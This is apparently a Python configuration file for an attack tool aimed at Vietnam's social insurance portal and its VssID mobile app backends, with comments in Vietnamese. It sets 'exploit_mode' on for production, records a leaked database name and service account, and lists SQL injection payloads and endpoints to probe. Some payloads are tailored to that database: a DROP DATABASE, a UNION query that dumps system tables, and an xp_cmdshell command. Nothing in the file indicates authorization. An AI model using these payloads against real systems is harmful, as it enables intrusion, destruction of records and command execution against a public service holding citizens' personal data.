
# Cấu hình cho Security Assessment Framework
import os

# Cấu hình target - THỰC THI TRÊN HỆ THỐNG PRODUCTION
TARGET_CONFIG = {
    "base_url": "https://baohiemxahoi.gov.vn",  # Target chính thức BHXH Việt Nam
    "secondary_urls": [
        "https://vssid-6fe8b.appspot.com",  # Firebase backend từ APK
        "https://com.innovationlab.ekycvideouploading.com",
        "https://api-test.vssid.com"
    ],
    "apk_path": "/workspaces/chandoi12/LightblueQueasyInversion/test_data/VssID_1.7.1_APKPure.apk",
    "output_dir": "./results",
    "exploit_mode": True,  # Production exploitation mode
    # Thông tin lỗi thực tế đã phát hiện
    "discovered_vulnerability": {
        "database_name": "SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4",
        "failed_user": "BHXH\\sharepoint_portal", 
        "error_code": "0x80131904",
        "vulnerability_type": "Database Error Exposure",
        "severity": "HIGH"
    }
}

# SQL Injection exploit payloads - PRODUCTION GRADE
PAYLOADS = {
    "sqli_basic": [
        "1' OR '1'='1'--",
        "1' OR '1'='1' #",
        "admin'--",
        "admin' /*",
        "' OR 1=1--"
    ],
    "sqli_union": [
        "1' UNION SELECT 1,2,3,4,5--",
        "1' UNION SELECT @@version,user(),database()--", 
        "1' UNION SELECT null,null,null--"
    ],
    "sqli_error": [
        "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
    ],
    "sqli_time": [
        "1' AND (SELECT SLEEP(5))--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT pg_sleep(5))--"
    ],
    # Payloads đặc biệt cho lỗ hổng SessionStateService đã phát hiện
    "sessionstate_exploit": [
        "'; DROP DATABASE SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4--",
        "' UNION SELECT * FROM SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4..sysobjects--",
        "'; EXEC xp_cmdshell('net user BHXH\\sharepoint_portal')--"
    ]
}

# Common API endpoints to test cho BHXH
COMMON_ENDPOINTS = [
    "",
    "Pages/default.aspx",
    "api/",
    "api/v1/",
    "api/v2/",
    "vssid/",
    "ekyc/",
    "v1/ekyc/",
    "v1/ekyc/verify", 
    "v1/ekyc/upload",
    "v1/user/",
    "v1/user/verify",
    "v1/document/",
    "services/",
    "auth/",
    "login/",
    "admin/",
    "admin/api/",
    "admin/login",
    "debug/",
    "health/",
    "status/",
    "info/",
    "bhxh/",
    "vssid-api/",
    "mobile-api/"
]

# Tạo thư mục kết quả
os.makedirs(TARGET_CONFIG["output_dir"], exist_ok=True)
